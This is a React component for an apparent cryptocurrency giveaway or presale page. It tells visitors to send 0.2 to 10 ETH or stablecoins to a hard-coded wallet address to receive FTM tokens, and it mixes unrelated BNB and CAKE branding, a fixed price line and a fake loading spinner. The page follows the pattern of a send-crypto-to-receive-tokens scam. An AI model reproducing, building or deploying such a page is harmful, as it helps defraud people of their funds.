import React from "react";
import Faq from "./faq";
// import Binance from 'node-binance-api'
// const binance = new Binance().options({
//   APIKEY: '<key>',
//   APISECRET: '<secret>'
// });

export default function Main() {

  // const fetchPrice = () => {
  //   binance.prices('BNBBTC', (error, ticker) => {
  //     console.info("Price of BNB: ", ticker.BNBBTC);
  //   });

  // }

  return (
    <>
      <div className="row">
        <div className="col-sm-12 col-1g-6 col-md-6  flex-c">
          <span className="img-box">
            <img src="https://fantomsale.foundation/qr-code.png" />
          </span>
        </div>
        <div className=" col-sm-12 col-1g-6 col-md-6 pl-4 pt-5">

          <h2 className="text-center">Send <span style={{ color: "black" }}>BNB</span> earn  <span style={{ color: "#b62f4f" }}> CAKE</span> </h2>
          <span className="cake-img">
            <img src="https://www.logo.wine/a/logo/Binance/Binance-BNB-Icon-Logo.wine.svg" />

            <img className="pr-5 pt-3" src="https://cryptologos.cc/logos/pancakeswap-cake-logo.png" style={{ height: '79px' }} />

          </span>
          <p className="text-center"><b>1 BNB = $300</b></p>
        </div>
      </div>

      <div className="bg-bnb flex-c">
        <span>
          <p className="text-left ">
            <b>  To get $FTM tokens, send from 0.2 to 10 ETH or USDT/TUSD/USDC
              [ERC-20] to the address below:</b>
          </p>
        </span>

        <div className="">
          <div className="address">
            <p className="text-center"><b>0xa0b8F971300734F903A7Ca5E24c505feC3B0622E</b></p>
          </div>
        </div>

        <span className=" text-center">
          <i class="fa fa-spinner fa-spin fa-3x fa-fw"></i>
          <span class="sr-only">Loading...</span>
          <h3></h3>
        </span>
      </div>

      <div className="faq">
        <Faq />
      </div>
    </>
  );
}
